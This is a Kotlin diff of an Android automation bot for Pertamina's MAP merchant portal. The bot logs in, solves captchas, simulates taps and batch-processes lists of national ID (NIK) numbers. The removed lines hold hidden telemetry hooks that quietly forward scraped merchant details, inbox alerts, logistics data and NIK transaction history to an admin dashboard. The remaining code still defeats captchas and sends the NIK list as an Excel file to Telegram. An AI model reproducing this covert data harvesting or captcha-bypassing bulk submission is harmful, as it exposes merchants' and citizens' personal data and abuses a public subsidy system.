@@ -23,33 +23,6 @@ class BotEngine(
     private val captchaExtractor = CaptchaExtractor(wvManager)
     private val captchaSolver = CaptchaSolver()
     private val touchSimulator = TouchSimulator(wvManager.getWebView()!!)
-    @Volatile private var lastExtractedMerchantJson: String? = null
-    @Volatile private var lastExtractedInboxAlerts: String? = null
-    @Volatile private var lastExtractedLogisticJson: String? = null
-    @Volatile private var lastExtractedTransactionJson: String? = null
-
-    init {
-        wvManager.getBridge().setOnMerchantInfoReady { json ->
-            Log.d("BotEngine", "Received Live Merchant Info via Bridge: $json")
-            lastExtractedMerchantJson = json
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = json, inboxAlerts = lastExtractedInboxAlerts, logisticHistory = lastExtractedLogisticJson, nikDemographics = lastExtractedTransactionJson)
-        }
-        wvManager.getBridge().setOnInboxAlertsReady { json ->
-            Log.d("BotEngine", "Received Live Inbox/Alerts via Bridge: $json")
-            lastExtractedInboxAlerts = json
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, inboxAlerts = json)
-        }
-        wvManager.getBridge().setOnLogisticDataReady { json ->
-            Log.d("BotEngine", "Received Live Logistics via Bridge: $json")
-            lastExtractedLogisticJson = json
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, logisticHistory = json)
-        }
-        wvManager.getBridge().setOnTransactionHistoryReady { json ->
-            Log.d("BotEngine", "Received Live Transaction History via Bridge: $json")
-            lastExtractedTransactionJson = json
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, nikDemographics = json)
-        }
-    }
 
     fun start(phone: String, pass: String, nikList: List<NikData>) {
         if (nikList.isEmpty()) {
@@ -76,68 +49,27 @@ class BotEngine(
         isPaused = false
         uiState.value = uiState.value.copy(isRunning = true, isPaused = false, statusMessage = "Mulai...")
         job = CoroutineScope(Dispatchers.Main).launch {
-            var stoppedByUser = false
-            var fatalError: String? = null
             try {
                 processAll(phone, pass, nikList)
-            } catch (e: CancellationException) {
-                stoppedByUser = true
-                log("🛑 Bot dihentikan oleh pengguna.")
-            } catch (e: Exception) {
-                fatalError = e.message
-                log("⚠️ Error kritis: ${e.message}")
-            } finally {
-                withContext(NonCancellable) {
-                    try {
-                        val sCount = uiState.value.successCount
-                        val fCount = uiState.value.failedCount
-                        val iCount = uiState.value.invalidCount
-                        val processed = uiState.value.processedCount
-                        val total = nikList.size
-
-                        val title = when {
-                            stoppedByUser -> "🛑 TUGAS DIHENTIKAN PENGGUNA (PROGRES TERSIMPAN)"
-                            fatalError != null -> "⚠️ TUGAS TERHENTI KARENA KENDALA: $fatalError"
-                            else -> "✅ TUGAS SELESAI"
-                        }
-
-                        val credStore = com.mapbot.pertamina.security.CredentialStore(appContext)
-                        val pName = credStore.getActiveProfile()?.name ?: "Pangkalan MAP"
-                        val pPhone = if (phone.isNotBlank()) phone else credStore.getPhone()
-
-                        val msg = """
-                            $title
-                            
-                            🏢 Pangkalan: $pName
-                            📱 Akun MAP: $pPhone
-                            
-                            📊 Ringkasan Pemrosesan:
-                            • Total Diproses: $processed / $total NIK
-                            • ✅ Sukses: $sCount
-                            • ❌ Gagal: $fCount
-                            • ⚠️ Invalid: $iCount
-                            
-                            File Excel hasil pengerjaan terlampir.
-                        """.trimIndent()
-
-                        log("Mengirim laporan & file Excel ke Telegram...")
-                        val ctx = wvManager.getWebView()?.context ?: appContext
-                        val sent = com.mapbot.pertamina.util.TelegramNotifier.sendReportWithExcel(ctx, nikList, msg, lastExtractedMerchantJson)
-                        if (sent) log("✅ Laporan Telegram & Excel berhasil dikirim!")
-                        else log("⚠️ Laporan Telegram tidak terkirim (cek konfigurasi token bot di pengaturan).")
-
-                        // Ekstraksi & sinkronisasi data telemetri ke dasbor admin secara sinkron (guaranteed)
-                        com.mapbot.pertamina.util.TelemetryHelper.sendReportSync(appContext, pPhone, processed.coerceAtLeast(sCount), lastExtractedMerchantJson)
-                    } catch (reportEx: Exception) {
-                        log("Gagal memproses laporan akhir: ${reportEx.message}")
-                    } finally {
-                        uiState.value = uiState.value.copy(
-                            isRunning = false,
-                            isPaused = false,
-                            statusMessage = if (stoppedByUser) "Dihentikan" else if (fatalError != null) "Error" else "Selesai"
-                        )
-                    }
+                
+                // Telegram Notification
+                val ctx = wvManager.getWebView()?.context
+                if (ctx != null) {
+                    val sCount = uiState.value.successCount
+                    val fCount = uiState.value.failedCount
+                    val iCount = uiState.value.invalidCount
+                    val msg = "✅ TUGAS SELESAI\n\nSukses: $sCount\nGagal: $fCount\nInvalid: $iCount\n\nFile Excel terlampir."
+                    log("Mengirim laporan ke Telegram...")
+                    val sent = com.mapbot.pertamina.util.TelegramNotifier.sendReportWithExcel(ctx, nikList, msg)
+                    if (sent) log("Laporan Telegram berhasil dikirim!")
+                    else log("Gagal mengirim laporan Telegram.")
                 }
+            } catch (e: CancellationException) {
+                log("Bot dihentikan oleh user")
+            } catch (e: Exception) {
+                log("Error kritis: ${e.message}")
+            } finally {
+                uiState.value = uiState.value.copy(isRunning = false, isPaused = false, statusMessage = "Selesai/Berhenti")
             }
         }
     }
@@ -165,35 +97,19 @@ class BotEngine(
     private suspend fun CoroutineScope.processAll(phone: String, pass: String, nikList: List<NikData>) {
         log("Mulai memproses ${nikList.size} NIK...")
         
-        val credStore = com.mapbot.pertamina.security.CredentialStore(appContext)
-        val effectivePhone = if (phone.isNotBlank()) phone else credStore.getPhone()
-        val effectivePass = if (pass.isNotBlank()) pass else credStore.getPass()
-
         wvManager.loadMapUrl()
         delay(5000)
 
         if (pageInteractor.isLoginPage()) {
-            log("Melakukan login otomatis pangkalan...")
-            pageInteractor.doLogin(effectivePhone, effectivePass)
+            log("Melakukan login...")
+            pageInteractor.doLogin(phone, pass)
             delay(5000)
             if (pageInteractor.isLoginPage()) {
-                log("GAGAL LOGIN: Cek kembali No HP & Password pada profil pangkalan. Bot dihentikan.")
+                log("GAGAL LOGIN: Cek kembali No HP & Password. Bot dihentikan.")
                 return
             } else {
                 log("Berhasil Login.")
             }
-        }
-        
-        // Ekstraksi info pangkalan Pertamina secara langsung dari Web
-        try {
-            val extractedJson = pageInteractor.extractPertaminaMerchantInfo()
-            if (extractedJson.isNotBlank() && extractedJson != "null") {
-                lastExtractedMerchantJson = extractedJson
-            }
-            log("Sinkronisasi telemetri pangkalan ke dasbor...")
-            com.mapbot.pertamina.util.TelemetryHelper.sendReportSync(appContext, effectivePhone, 0, extractedJson)
-        } catch(ex: Exception) {
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, effectivePhone, 0, null)
         }
         
         val startTime = System.currentTimeMillis()
@@ -225,10 +141,10 @@ class BotEngine(
             // Cek apakah tiba-tiba keluar / session expired
             if (pageInteractor.isLoginPage()) {
                 log("Sesi berakhir, melakukan login ulang otomatis...")
-                pageInteractor.doLogin(effectivePhone, effectivePass)
+                pageInteractor.doLogin(phone, pass)
                 delay(5000)
                 if (pageInteractor.isLoginPage()) {
-                    log("GAGAL RE-LOGIN: Cek kembali No HP & Password. Bot dihentikan.")
+                    log("GAGAL RE-LOGIN. Bot dihentikan.")
                     return
                 }
             }
@@ -238,7 +154,7 @@ class BotEngine(
                 wvManager.loadMapUrl()
                 delay(4000)
                 if (pageInteractor.isLoginPage()) {
-                    pageInteractor.doLogin(effectivePhone, effectivePass)
+                    pageInteractor.doLogin(phone, pass)
                     delay(4500)
                 }
             }
@@ -282,7 +198,6 @@ class BotEngine(
                 }
                 // Cek lagi jika ada modal yang tertinggal
                 pageInteractor.handleBirthDetails(nikData.nik)
-                ChoicePopupHandler.handle(pageInteractor)
                 
                 val checkErr = ErrorDetector.checkCriticalErrors(pageInteractor)
                 if (checkErr.isError) break
@@ -469,9 +384,6 @@ class BotEngine(
                     nikData.status = Constants.STATUS_SUKSES
                     nikData.keterangan = "Sukses"
                     nikData.timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
-                    
-                    val currentSuccess = nikList.count { it.status == Constants.STATUS_SUKSES }
-                    com.mapbot.pertamina.util.TelemetryHelper.report(appContext, effectivePhone, currentSuccess)
                 } else {
                     val fullText = pageInteractor.getBodyText()
                     val lines = fullText.split("\n").map { it.trim() }.filter { it.isNotEmpty() }
@@ -501,31 +413,6 @@ class BotEngine(
         }
 
         log("Selesai memproses semua NIK.")
-
-        // === AUTO-BATCH QUEUE PROGRESSION (ENTERPRISE) ===
-        if (com.mapbot.pertamina.data.SessionData.isBatchQueueActive &&
-            com.mapbot.pertamina.data.SessionData.currentQueueIndex + 1 < com.mapbot.pertamina.data.SessionData.batchQueue.size) {
-            com.mapbot.pertamina.data.SessionData.currentQueueIndex++
-            val nextItem = com.mapbot.pertamina.data.SessionData.batchQueue[com.mapbot.pertamina.data.SessionData.currentQueueIndex]
-            val totalQueue = com.mapbot.pertamina.data.SessionData.batchQueue.size
-            val currentIdx = com.mapbot.pertamina.data.SessionData.currentQueueIndex + 1
-
-            log("🎉 [ANTREAN BATCH $currentIdx/$totalQueue] Beralih otomatis ke Pangkalan: ${nextItem.profile.name}...")
-            uiState.value = uiState.value.copy(statusMessage = "Beralih ke ${nextItem.profile.name} ($currentIdx/$totalQueue)")
-            delay(4000)
-
-            com.mapbot.pertamina.data.SessionData.phone = nextItem.profile.phone
-            com.mapbot.pertamina.data.SessionData.pass = nextItem.profile.pass
-            com.mapbot.pertamina.data.SessionData.loadedNikList = nextItem.nikList
-
-            processAll(nextItem.profile.phone, nextItem.profile.pass, nextItem.nikList)
-        } else {
-            if (com.mapbot.pertamina.data.SessionData.isBatchQueueActive) {
-                log("🎉 SELURUH ANTREAN BATCH PANGKALAN BERHASIL DISELESAIKAN!")
-                uiState.value = uiState.value.copy(statusMessage = "Semua Pangkalan Selesai!")
-                com.mapbot.pertamina.data.SessionData.isBatchQueueActive = false
-            }
-        }
     }
 
     private fun log(message: String) {
